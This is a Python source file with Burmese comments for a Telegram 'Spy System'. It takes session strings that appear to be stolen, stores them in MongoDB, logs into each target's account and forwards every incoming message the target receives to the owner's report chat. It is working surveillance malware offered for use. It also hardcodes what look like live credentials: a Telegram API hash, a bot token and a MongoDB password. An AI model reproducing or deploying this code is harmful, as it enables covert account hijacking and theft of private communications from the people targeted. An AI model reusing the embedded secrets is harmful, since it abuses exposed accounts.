import os
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from pymongo import MongoClient
from flask import Flask
app = Flask(__name__)

# --- Configurations ---
API_ID = 38225985
API_HASH = "0b6330bc916f9e29d6bf302be079e9d6"
BOT_TOKEN = "8738081667:AAGr7HkSxO6nC_QhPJJElKR2VKABTEDfNEo"
OWNER_ID = 6015356597
REPORT_CHAT = -1003836655698

# MongoDB Setup
MONGO_URI = "mongodb+srv://khantphyoemin537_db_user:9VRKiaeZkz7rJdpz@cluster0.w6tgi8j.mongodb.net/?appName=Cluster0&tlsAllowInvalidCertificates=true"
db_client = MongoClient(MONGO_URI)
db = db_client["SpySystem_DB"]
sessions_db = db["active_strings"]

# Main Bot Client (သခင်လေးနဲ့ ဆက်သွယ်ဖို့)
bot = TelegramClient("report_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_clients = {} # Run နေတဲ့ UserBot တွေကို သိမ်းထားဖို့

# ==========================================
# 🛰 USERBOT SPY LOGIC (Target ဆီက စာဖတ်ခြင်း)
# ==========================================
async def run_spy_client(session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        uid = me.id
        
        @client.on(events.NewMessage)
        async def spy_handler(event):
            # Report Chat ကိုတော့ ချန်ထားမယ်
            if event.chat_id == REPORT_CHAT: return
            
            chat = await event.get_chat()
            chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Unknown'))
            
            # Bot ကနေတစ်ဆင့် သခင်လေးဆီ Report ပို့မယ်
            report_text = (
                f"🚨 **Spy Report (Target: {me.first_name})**\n"
                f"📍 **In Chat:** {chat_name} (`{event.chat_id}`)\n"
                f"👤 **Sender:** {event.sender.first_name if event.sender else 'Unknown'}\n"
                f"💬 **Message:** {event.raw_text}"
            )
            await bot.send_message(REPORT_CHAT, report_text)

        active_clients[uid] = client
        await client.run_until_disconnected()
    except Exception as e:
        print(f"Error on session {session_str[:10]}: {e}")

# ==========================================
# ⚙️ STRING MANAGER COMMANDS
# ==========================================

# String ကို Reply ပြန်ပြီး သိမ်းမည့် Logic
@bot.on(events.NewMessage(pattern="/string"))
async def add_string(event):
    if event.sender_id != OWNER_ID: return
    if not event.is_reply:
        return await event.reply("❌ String စာသားကို Reply ထောက်ပြီး `/string` လို့ ရိုက်ပေးပါ သခင်လေး။")

    reply_msg = await event.get_reply_message()
    session_str = reply_msg.raw_text.strip()

    # DB မှာ သိမ်းမယ်
    if not sessions_db.find_one({"session": session_str}):
        sessions_db.insert_one({"session": session_str})
        await event.reply("✅ String ကို DB မှာ သိမ်းလိုက်ပါပြီ။ စောင့်ကြည့်မှု စတင်နေပါပြီ...")
        # စောင့်ကြည့်မှု ချက်ချင်း စတင်မယ်
        asyncio.create_task(run_spy_client(session_str))
    else:
        await event.reply("⚠️ ဒီ String က ရှိပြီးသားကြီးပါ သခင်လေး။")

# Bot ပွင့်လာတာနဲ့ DB ထဲက String အဟောင်းတွေကို ပြန် Run မယ်
async def restart_all_spies():
    for data in sessions_db.find():
        asyncio.create_task(run_spy_client(data["session"]))

# ==========================================
# 🚀 START SYSTEM
# ==========================================
if __name__ == "__main__":
    # Render အတွက် Port ကို background မှာ ဖွင့်မယ်
    from threading import Thread
    def run_flask():
        port = int(os.environ.get("PORT", 10000))
        app.run(host='0.0.0.0', port=port)

    Thread(target=run_flask).start() # Flask ကို သီးသန့် thread နဲ့ run မယ်

    print("🦇 Spy System is Online...")
    bot.loop.create_task(restart_all_spies())
    bot.run_until_disconnected()

